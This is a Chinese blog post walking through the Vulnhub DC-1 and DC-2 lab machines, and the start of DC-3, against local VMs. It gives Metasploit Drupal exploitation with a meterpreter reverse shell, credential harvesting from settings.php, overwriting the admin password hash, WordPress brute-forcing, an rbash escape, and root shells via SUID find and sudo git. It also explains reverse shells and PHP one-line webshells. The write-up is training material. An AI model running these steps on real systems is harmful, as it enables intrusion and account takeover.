<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="baidu-site-verification" content="093lY4ziMu" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="description" content="blog-wxx">
    <meta name="keyword"  content="wxx">
    <link rel="shortcut icon" href="/img/ironman-draw.png">
    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>
    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
    <title>
        
          DC - wxx&#39;s_Blog
        
    </title>

    <link rel="canonical" href="https://github.com/wxx0105/wxx0105.github.io/2022/02/04/DC-1/">

    <!-- Bootstrap Core CSS -->
    
<link rel="stylesheet" href="/css/bootstrap.min.css">


    <!-- Custom CSS --> 
    
        
<link rel="stylesheet" href="/css/dusign-dark.css">

        
<link rel="stylesheet" href="/css/dusign-common-dark.css">

        
<link rel="stylesheet" href="/css/font-awesome.css">

        
<link rel="stylesheet" href="/css/toc.css">

    
    
    <!-- Pygments Highlight CSS -->
    
<link rel="stylesheet" href="/css/highlight.css">


    
<link rel="stylesheet" href="/css/widget.css">


    
<link rel="stylesheet" href="/css/rocket.css">


    
<link rel="stylesheet" href="/css/signature.css">


    
<link rel="stylesheet" href="/css/fonts.googleapis.css">


    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">

    <!-- photography -->
    
<link rel="stylesheet" href="/css/photography.css">


    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- background effects start -->
    
    <!-- background effects end -->

	<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        
            
                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.5)), url('../../../../img/wallhaven-rde6mj.png')
                /*post*/
            
        
    }
    
</style>

<header class="intro-header" >
    <!-- Signature -->
    <div id="signature">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                
                    <div class="post-heading">
                        <div class="tags">
                            
                              <a class="tag" href="/tags/#DC靶场" title="DC靶场">DC靶场</a>
                            
                        </div>
                        <h1>DC</h1>
                        <h2 class="subheading"></h2>
                        <span class="meta">
                            Posted by wx_x on
                            2022-02-04
                        </span>

                        
                            <div class="blank_box"></div>
                            <span class="meta">
                                Words <span class="post-count">14.6k</span> and
                                Reading Time <span class="post-count">59</span> Minutes
                            </span>
                            <div class="blank_box"></div>
                            <!-- 不蒜子统计 start -->
                            <span class="meta">
                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
                            </span>
                            <!-- 不蒜子统计 end -->
                        

                    </div>
                

                </div>
            </div>
        </div>      
    </div>

    
    <div class="waveWrapper">
        <div class="wave wave_before" style="background-image: url('/img/wave-dark.png')"></div>
        <div class="wave wave_after" style="background-image: url('/img/wave-dark.png')"></div>
    </div>
    
</header>

	
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">wxx</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>

                    

                        
                    

                        
                        <li>
                            <a href="/about/">About</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/archive/">Archives</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/tags/">Tags</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/photography/">Photography</a>
                        </li>
                        
                    
                    
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    $toggle.addEventListener('click', handleMagic)
    function handleMagic(e){
        if ($navbar.className.indexOf('in') > 0) {
        // CLOSE
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        }else{
        // OPEN
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }
</script>


    <!-- Main Content -->
    <!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

                <a id="more"></a>
<p>渗透初探，内网操作，下面是dc系列靶场</p>
<p><a href="https://www.google.com/search?q=：https%3A%2F%2Fdownload.vulnhub.com%2Fdc%2F或http%3A%2F%2Fwww.five86.com%2Fdownloads.html&amp;oq=：https%3A%2F%2Fdownload.vulnhub.com%2Fdc%2F或http%3A%2F%2Fwww.five86.com%2Fdownloads.html&amp;aqs=edge..69i57&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank" rel="noopener">：https://download.vulnhub.com/dc/或http://www.five86.com/downloads.html - Google 搜索</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw disable  &#x2F;&#x2F;关闭傻逼防火墙kali，天天给我开</span><br></pre></td></tr></table></figure>
<h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="打开靶场"><a href="#打开靶场" class="headerlink" title="打开靶场"></a>打开靶场</h4><h4 id="linux必备命令"><a href="#linux必备命令" class="headerlink" title="linux必备命令"></a>linux必备命令</h4><h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><p><strong>外壳程序（Shell）</strong> 为你提供与 Unix 操作系统的<strong>交互接口</strong>。它收集来自你的输入并解释输入并<strong>执行</strong>，当执行完成后，显示执行输出结果运行的外壳程序是一个运行环境，你可以在其中执行命令，运行程序或外壳脚本等。</p>
<h4 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h4><h4 id="PHP-Meterpreter后门"><a href="#PHP-Meterpreter后门" class="headerlink" title="PHP Meterpreter后门"></a>PHP Meterpreter后门</h4><h4 id="SUID-find提权"><a href="#SUID-find提权" class="headerlink" title="SUID- find提权"></a>SUID- find提权</h4><p><a href="https://cloud.tencent.com/developer/article/1348438" target="_blank" rel="noopener">Linux中find命令用法全汇总，看完就没有不会用的！ - 云+社区 - 腾讯云 (tencent.com)</a></p>
<h4 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><p>使用Arp-Scan挥或者Netdiscover</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l &#x2F;&#x2F;arp-scan可用来发现本地网络上的IP主机。</span><br><span class="line">netdiscover -r ip&#x2F;netmask &#x2F;&#x2F;我没成功。。。</span><br></pre></td></tr></table></figure>
<h3 id="DC-1-实操"><a href="#DC-1-实操" class="headerlink" title="DC-1 实操"></a>DC-1 实操</h3><p>信息收集</p>
<p>由于均在同一局域网下，可以在kali进行内网探测，使用arp-scan命令：<code>arp-scan-l</code>，即可探测得目标ip：<code>192.168.136.131</code>，得到ip后，第一个想到nmap扫一下<code>nmap -sS 192.168.136.131</code>，端口22，80，111开放，发现是drupal整站系统（CMS），直接搜寻该CMS漏洞，发现可以使用msf渗透攻击。</p>
<p>msfconsole渗透攻击</p>
<p>msfconsole使用非常方便快捷，有些kali自带，有些需要自己下载，有时候下载也不会很顺利，慢慢解决即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br><span class="line">use 2</span><br><span class="line">show payloads &#x2F;&#x2F;查看相关命令</span><br><span class="line">set payload 15 &#x2F;&#x2F;也可以set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set rhosts 192.168.136.131&#x2F;&#x2F;设定目标机ip address</span><br><span class="line">run&#x2F;&#x2F;开始攻击</span><br><span class="line">-·-·-·-·-·-·-·-·-·loading·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·--·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-</span><br><span class="line">结束攻击时，会回显   meterpreter&gt;     &#x2F;&#x2F;即可开始操作，这就开始linux命令</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;&#x2F;即可发现flag1.txt，也可以获得所在位置</span><br><span class="line">cat flag1.txt  &#x2F;&#x2F;查看后告诉我们去找配置文件，我们在打网站，所以应该去找sites的settings</span><br><span class="line">cd sites</span><br><span class="line">ls</span><br><span class="line">cat settings.php &#x2F;&#x2F;我们可以发现mysql的账号密码，于是我们开始尝试登录，查看用户信息</span><br><span class="line">mysql -udbuser -pR0ck3t&#x2F;&#x2F;发现数据库只能本地连接，那么我们这就需要反弹一个shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;&#x2F;&#x2F;进入www-data@DC-1:&#x2F;var&#x2F;www&#x2F;</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databses;&#x2F;s&#x2F;打连环拳</span><br><span class="line">use drupdb;</span><br><span class="line">show tables;&#x2F;&#x2F;发现有users表，这正是我们每次渴望的</span><br><span class="line">select * from users;&#x2F;&#x2F;可以发现用户的登陆密码使用加密算法加密过，我们很难看明白使用了什么方式加密，所以这里就需要更换思路，尝试采用对方的加密方式覆盖掉原来的密码就可以了。</span><br><span class="line">cd ..&#x2F;..&#x2F;    &#x2F;&#x2F;重新回到www目录，那么开始找寻加密算法，直接去scripts（一个一个找有关passwd）</span><br><span class="line">cd scripts</span><br><span class="line">ls &#x2F;&#x2F;果然发现有password-hash.sh，SH文件是脚本 为bash编程</span><br><span class="line">php password-hash.sh 123 &#x2F;&#x2F;php使用该加密算法，&#39;123&#39;为被加密明文，执行后即可看到加密密文</span><br><span class="line">mysql -udbuser -pR0ck3t &#x2F;&#x2F;再次进入数据库，进入drupaldb。</span><br><span class="line">update users set pass&#x3D;&quot;$S$DxQCTfic1drhqY7jbCf62drw&#x2F;T204r3is.&#x2F;KmIUKEzlQUpfHx1RQ&quot; where uid&#x3D;1&#x2F;&#x2F;替换代码，基础sql语句</span><br></pre></td></tr></table></figure>
<p>到这里就可以登陆网站看看了，其实我也不是很懂这个admin/content怎么来的。。</p>
<p>言归正传，这里就可以看到flag3.txt了，查看发现，告诉我们有东西在root目录下。</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211101215955142.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root &#x2F;&#x2F;不出意外，我被denied了，但是但是，flag3.txt提示我们使用find提权。</span><br><span class="line">cd  &#x2F;&#x2F;回到网站目录&#x2F;www</span><br><span class="line">touch a</span><br><span class="line">find &#x2F; a -exec &quot;&#x2F;bin&#x2F;sh&quot;\;    &#x2F;&#x2F;一步到位。原理可能看一天忘一天。。。</span><br><span class="line">#cd &#x2F;root</span><br><span class="line">cat  thefinalflag.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211101222748790.png" alt="image-20211101222748790"></p>
<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="cewl使用（概括）"><a href="#cewl使用（概括）" class="headerlink" title="cewl使用（概括）"></a>cewl使用（概括）</h4><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。需要配合使用！</p>
<h4 id="dirb扫目录（kali）"><a href="#dirb扫目录（kali）" class="headerlink" title="dirb扫目录（kali）"></a>dirb扫目录（kali）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.136.130&#x2F;   &#x2F;&#x2F;千万注意格式，cewl也是一定要注意格式，windows可以使用御剑以及7Kbscan。</span><br></pre></td></tr></table></figure>
<h4 id="wpscan（可结合Metasploit‘msf’利用插件中的漏洞）"><a href="#wpscan（可结合Metasploit‘msf’利用插件中的漏洞）" class="headerlink" title="wpscan（可结合Metasploit‘msf’利用插件中的漏洞）"></a>wpscan（可结合Metasploit‘msf’利用插件中的漏洞）</h4><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞，其中特别多人拿wpscan去扫WordPress的漏洞。</p>
<p>教程：<a href="https://www.freebuf.com/sectool/174663.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/174663.html</a></p>
<h4 id="WordPress网站内容管理系统"><a href="#WordPress网站内容管理系统" class="headerlink" title="WordPress网站内容管理系统"></a>WordPress网站内容管理系统</h4><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。辨别方法：查看源码中，搜索 wp-content，有那么就是wpress网站内容管理系统，可以搜寻相关漏洞复现。</p>
<p>参考：<a href="https://www.websiterating.com/zh-CN/wordpress/most-common-wordpress-vulnerabilities/" target="_blank" rel="noopener">https://www.websiterating.com/zh-CN/wordpress/most-common-wordpress-vulnerabilities/</a></p>
<h4 id="rebash绕过："><a href="#rebash绕过：" class="headerlink" title="rebash绕过："></a>rebash绕过：</h4><p>rbash是受限的shell的一种此外还有rbash、rksh和rsh，说到底，是防止获取到shell的非管理人员进行敏感操作。</p>
<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162589028916780274151824%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162589028916780274151824&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-111879362.first_rank_v2_pc_rank_v29&amp;utm_term=rbash&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43705814/article/details/111879362?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162589028916780274151824%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162589028916780274151824&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-111879362.first_rank_v2_pc_rank_v29&amp;utm_term=rbash&amp;spm=1018.2226.3001.4187</a></p>
<h4 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h4><p><a href="https://blog.csdn.net/qq_41123867/article/details/105150776" target="_blank" rel="noopener">https://blog.csdn.net/qq_41123867/article/details/105150776</a></p>
<h3 id="DC-2-实操"><a href="#DC-2-实操" class="headerlink" title="DC-2 实操"></a>DC-2 实操</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -A -v 192.168.136.130 &#x2F;&#x2F;发现开启80端口，那么直接访问，会出现找不到dc-2服务器。这时候进入kali 的&#x2F;etc&#x2F;hosts，写入 192.168.136.130 dc-2 即可。</span><br><span class="line">vim &#x2F;ect&#x2F;hosts &#x2F;&#x2F;写入后，就可以直接192.168.136.130访问到界面了</span><br><span class="line">访问192.168.136.130，即可看到flag标签，点击标签即可获得flag1，获得提示，叫我们去wpscan爆破，但是当前页面没有爆破的点啊，第一反应是目录扫描，其实这些都应该在上一步就完成，都是很重要的收集。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211104202233052.png" alt="image-20211104202233052"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.136.130&#x2F; &#x2F;&#x2F;爆破目录，注意格式┗|｀O′|┛ 嗷~~，</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.136.130&#x2F;wp-admin&#x2F;      &#x2F;&#x2F;非常之熟悉，点开即可，进入到登陆界面，开启wpscan爆破之旅</span><br><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w pass.txt   &#x2F;&#x2F;注意格式</span><br><span class="line">cat pass.txt  &#x2F;&#x2F;查看生成字典，wpscan需要自己导入字典，kali的导入就直接命令行输入所生成的字典名称。</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u    &#x2F;&#x2F;开始枚举wordpress用户名，admin，jerry，tom三个用户。</span><br><span class="line">vim user.txt  &#x2F;&#x2F;创建用户字典文件，用来wpscan爆破，注意pass.txt与user.txt需要在同一个目录下，自此，username与passwd都准备好了。</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -U user.txt -P pass.txt   &#x2F;&#x2F;使用wpscan进行暴力破解,获得了jerry和tom的密码，那么开干，直接登录即可获得flag2（tom这个g掉了，诱饵用户？存在肯定有他的道理，在没有绝对证据的前提下，千万不要否认任何一个给的信息）。</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211104220323764.png" alt="image-20211104220323764"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag2：</span><br><span class="line">如果你不能利用WordPress并走捷径，还有另一种方法。</span><br><span class="line">希望你找到了另一个入口。</span><br></pre></td></tr></table></figure>
<p>很好很好，马上想到ssh进行远程连接，因为上文有多一个账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali用法：ssh 用户名@xxx.xxx.xxx.xxx -p 7744</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jerry@192.168.136.130 -p 7744   &#x2F;&#x2F;无论怎么样登录都是denied，那就换一个</span><br><span class="line">ssh tom@192.168.136.130 -p 7744   &#x2F;&#x2F;可以登录，输入密码后，即可进入</span><br></pre></td></tr></table></figure>
<p>tom账户下的命令行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls  &#x2F;&#x2F;可以看到有flag3.txt</span><br><span class="line">vim flag3.txt &#x2F;&#x2F;错误：-rbash: cat: command not found</span><br><span class="line">cat flag3.txt &#x2F;&#x2F;错误：-rbash: cat: command not found</span><br><span class="line">第一反应该是搜索-rbash绕过以及提权，但是我想起来之前配置kali的时候，不知什么原因没有下载vim，但是我这个镜像不给力，所以只能被迫搜索没有vim的情况下修改镜像，发现可以使用 ‘vi’，就可以直接写入，只是用法稍微与vim有所不同。</span><br><span class="line">vi flag3.txt  &#x2F;&#x2F;hah直接读出。但是后面也需要进行提权，没办法还是要提权，小窃喜一波。看提示！</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211104222521226.png" alt="image-20211104222521226"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a  注：把&#x2F;bin&#x2F;bash给a变量</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;    注：将&#x2F;bin 作为PATH环境变量导出</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin   注：将&#x2F;usr&#x2F;bin作为PATH环境变量导出</span><br><span class="line">完成提权，可以直接cat flag3.txt。</span><br><span class="line">提示说&quot;可怜的老汤姆总是在追杰瑞。也许他应该忍受他造成的所有压力。&quot;,有杰瑞，有汤米，尝试切换 su jerry ，输入密码后，发现进入了jerry的账户，但是ls又被rbash给ban了，难道又要绕过，非也非也。</span><br></pre></td></tr></table></figure>
<p>jerry命令行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ..&#x2F;</span><br><span class="line">ls  &#x2F;&#x2F;发现jerry目录</span><br><span class="line">cd jerry   </span><br><span class="line">ls  &#x2F;&#x2F;发现flag4.txt</span><br><span class="line">flag4.txt：</span><br><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).</span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
<p>git肯定有点东西，也知道还需要提权。attention!!!这里我得去kali虚拟机里操作，不然一直不出git -p 之后不出命令行，上面没有写在哪操作的一律在windows操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p </span><br><span class="line">:!&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;root</span><br><span class="line">cat flnal-flag.txt &#x2F;&#x2F;完成</span><br></pre></td></tr></table></figure>
<h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="nmap脚本script的使用"><a href="#nmap脚本script的使用" class="headerlink" title="nmap脚本script的使用"></a>nmap脚本script的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脚本扫描，参考https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;26618074</span><br><span class="line">nmap --script&#x3D;vuln 192.168.136.131   &#x2F;&#x2F;这个是相对与使用joomscan方便一点</span><br></pre></td></tr></table></figure>
<h4 id="Joomia的CMS扫描"><a href="#Joomia的CMS扫描" class="headerlink" title="Joomia的CMS扫描"></a>Joomia的CMS扫描</h4><p>使用joomscan,获得网站版本信息，以及后台登陆地址。</p>
<h4 id="查看kali的漏洞库"><a href="#查看kali的漏洞库" class="headerlink" title="查看kali的漏洞库"></a>查看kali的漏洞库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit参考：https:&#x2F;&#x2F;blog.51cto.com&#x2F;simeon&#x2F;2927824</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0 &#x2F;&#x2F;获取对应病毒库中的信息位置</span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps</span><br><span class="line">ls  &#x2F;&#x2F;即可查看kali自带病毒库源文件，searchexploit命令也是在这里检索。</span><br><span class="line">cat xxxx.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106111154507.png" alt="image-20211106111154507"></p>
<h4 id="john破解散列哈希"><a href="#john破解散列哈希" class="headerlink" title="john破解散列哈希"></a>john破解散列哈希</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;WQ_BCJ&#x2F;article&#x2F;details&#x2F;84992462</span><br><span class="line">hashid识别不同类型的散列加密：  hashid [option] INPUT</span><br></pre></td></tr></table></figure>
<h4 id="反弹shell（初次接触，打好基础）"><a href="#反弹shell（初次接触，打好基础）" class="headerlink" title="反弹shell（初次接触，打好基础）"></a>反弹shell（初次接触，打好基础）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">本质：C&#x2F;S反转</span><br><span class="line">解释：攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，为反弹连接，反向连接</span><br><span class="line">为何要反弹，反向连接？</span><br><span class="line">用于：被控端因防火墙受限、权限不足、端口被占用等情形（多人解释）</span><br><span class="line">原因：因为正向连接在一定情况下使用成本高：</span><br><span class="line">1.动态ip的受害者主机</span><br><span class="line">2.受害者主机中网马但处于局域网内</span><br><span class="line">3.当未知受害者主机是否成功中招，以及未知受害者主机各种情况时（所处网络环境，何时上线）</span><br><span class="line">故建立一服务端，使受害者主机上线后主动连接。</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------通俗说法：shell是操作主机的接口，反弹shell就是把权限弹给别人，让其它人可以操作自己的计算机，也是为后渗透的方便。</span><br><span class="line">https:&#x2F;&#x2F;www.hackbase.net&#x2F;security&#x2F;secschool&#x2F;261444.html</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;read&#x2F;cv8186663</span><br></pre></td></tr></table></figure>
<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6957 </span><br><span class="line">php参考手册：https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;index.php</span><br><span class="line"></span><br><span class="line">这玩意儿我看了好多次都忘记，记得他是将文本按照命令执行，然后返回结果的就行。</span><br><span class="line"></span><br><span class="line">eval函数：在一些程序语言中，eval 是一个把字符串当作表达式执行而返回一个结果的函数；在另一些之中，它执行多行的代码就好像它们被包括在其中，而不是包括eval 的这一行。eval 的输入不一定是字符串；在支持句法抽象的语言中，eval 的输入将会由抽象句法形式组成。</span><br></pre></td></tr></table></figure>
<h4 id="哥斯拉使用"><a href="#哥斯拉使用" class="headerlink" title="哥斯拉使用"></a>哥斯拉使用</h4><h3 id="DC-3实操"><a href="#DC-3实操" class="headerlink" title="DC-3实操"></a>DC-3实操</h3><p>依然开启靶机，设置网络设置到NAT模式，更改设置为下图所示，之前的不用设置，不知为何这个要设置，不然就报错，打不开。</p>
<p><img src="https://gitee.com/wxx0105/images/raw/master/img/image-20211106132646805.png" alt="image-20211106132646805"></p>
